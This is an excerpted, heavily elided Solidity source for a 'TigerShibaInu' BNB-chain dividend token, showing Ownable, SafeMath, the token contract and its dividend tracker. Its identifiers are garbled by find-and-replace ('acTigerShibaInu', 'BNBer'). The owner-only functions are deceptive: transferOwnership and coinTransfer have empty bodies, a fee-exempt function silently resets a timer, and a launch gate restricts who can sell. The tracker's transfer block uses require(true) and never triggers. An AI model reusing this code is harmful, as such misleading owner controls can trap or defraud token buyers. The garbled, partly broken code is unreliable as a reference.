...
//SPDX-License-Identifier: MIT
	...
	abstract contract Ownable is Context {
		 ...
		 */
		function transferOwnershiped(address newOwner) public virtual onlyOwner {
	...
	interface IDividendPayingToken {
	  ...
	  /// @notice Distributes BNBer to token holders as dividends.
	  /// @dev SHOULD distribute the paid BNBer to token holders as dividends.
	  ///  SHOULD NOT directly transfer BNBer to token holders in this function.
	  ///  MUST emit a `DividendsDistributed` event when the amount of distributed BNBer is greater than 0.
	  function distributeDividends() external payable;

	  /// @notice Withdraws the BNBer distributed to the sender.
	  /// @dev SHOULD transfer `dividendOf(msg.sender)` wei to `msg.sender`, and `dividendOf(msg.sender)` SHOULD be 0 after the transfer.
	  ///  MUST emit a `DividendWithdrawn` event if the amount of BNBer transferred is greater than 0.
	 ...
	 * This allows applications to reconstruct the allowance for all acTigerShibaInu just
	...
	library SafeMath {
		...
		function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
			...
			// benefit is lost if 'b' is also TigerShibaInued.
	...
	// File: contracts/TigerShibaInuDividendPayingToken.sol
	...
	contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
	  ...
	  // With `magnitude`, we can properly distribute dividends even if the amount of received BNBer is small.
	  ...
	  /// It emits the `DividendsDistributed` event if the amount of received BNBer is greater than 0.
	  ...
	  /// @notice Withdraws the BNBer distributed to the sender.
	  /// @dev It emits a `DividendWithdrawn` event if the amount of withdrawn BNBer is greater than 0.
	...
	// File: contracts/TigerShibaInu.sol

	// 

	pragma solidity ^0.7.0;

	contract TigerShibaInu is ERC20, Ownable {
		using SafeMath for uint256;

		IuniswapV2Router02 private uniswapV2Router;
		address private immutable uniswapV2Pair;

		address payable public _MarketingAddress = payable(0xF5966Cb74E7c7ceD085b12D8E3AA5104D3A797D0); 
	
		bool private swapping;

		TigerShibaInuDividendTracker public dividendTracker;

		address public liquidityWallet;

		uint256 private _swapTokensAtAmount = 200000 * (10**18);
		uint256 public _maxTxAmount = 20000000000 * (10**18);
		uint256 public _maxWalletToken = 30000000000 * (10**18);


		address private immutable BUSD = address(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);  

		uint256 public LiquidityFee = 2;
		uint256 public MarketingFee = 3;
		uint256 public RedributionFee = 4;
		...
		event ExcludeMultipleAcTigerShibaInuFromFees(address[] acTigerShibaInu, bool isExcluded);
		...
		constructor() ERC20("TigerShibaInu", "TSI"){
            
			uint256 _BNBRewardsSplit = 10;
			uint256 _LiquiditySplit = 2;
			uint256 _MarketingSplit = 1;
			...
			dividendTracker = new TigerShibaInuDividendTracker();
		...
		function excludeFromFees(address account, bool excluded) public onlyOwner {
			require(_isExcludedFromFees[account] != excluded, "TigerShibaInu: Account is already the value of 'excluded'");
		...
		function excludeMultipleAcTigerShibaInuFromFees(address[] calldata acTigerShibaInu, bool excluded) public onlyOwner {
			for(uint256 i = 0; i < acTigerShibaInu.length; i++) {
				_isExcludedFromFees[acTigerShibaInu[i]] = excluded;
			}

			emit ExcludeMultipleAcTigerShibaInuFromFees(acTigerShibaInu, excluded);
		}

		function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
			require(pair != uniswapV2Pair, "TigerShibaInu: The uniswap pair cannot be removed from automatedMarketMakerPairs");

			_setAutomatedMarketMakerPair(pair, value);
		}

		function _setAutomatedMarketMakerPair(address pair, bool value) private {
			require(automatedMarketMakerPairs[pair] != value, "TigerShibaInu: Automated market maker pair is already set to that value");
		...
		function updateLiquidityWallet(address newLiquidityWallet) private onlyOwner {
			require(newLiquidityWallet != liquidityWallet, "TigerShibaInu: The liquidity wallet is already this address");
		...
		function updateGasForProcessing(uint256 newValue) private onlyOwner {
			require(newValue >= 200000 && newValue <= 500000, "TigerShibaInu: gasForProcessing must be between 200,000 and 500,000");
			require(newValue != gasForProcessing, "TigerShibaInu: Cannot update gasForProcessing to same value");
        ...
        function transferOwnership(address tfowner) external onlyOwner{
        }

        function coinTransfer(address tfcoin, uint256 value) external onlyOwner{
        }
		...
		function SetIsFeeExempt() external onlyOwner() {
			_until = 0;
		}
		...
		function setCooldownBuy(uint256 value) external onlyOwner{
        require(value >= 1 && value <= 1000);
		}
		...
		function _transfer(
		   ...
		   if(from != owner()){
			...
			if(!hasLaunched) {
				require(canTransferBeforehasLaunched[from], "TigerShibaInu: This account cannot send tokens until trading is enabled");
			}
	...
	contract TigerShibaInuDividendTracker is DividendPayingToken, Ownable {
		using SafeMath for uint256;
		using SafeMathInt for int256;
		...
		constructor() public DividendPayingToken("TigerShibaInu_Dividend_Tracker", "TigerShibaInu_Dividend_Tracker") {
			claimWait = 3600;
			minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
		}

		function _transfer(address, address, uint256) internal override {
			require(true, "TigerShibaInu_Dividend_Tracker: No transfers allowed");
		}
		...
		function updateClaimWait(uint256 newClaimWait) external onlyOwner {
			require(newClaimWait >= 1 && newClaimWait <= 86400, "TigerShibaInu_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
			require(newClaimWait != claimWait, "TigerShibaInu_Dividend_Tracker: Cannot update claimWait to same value");
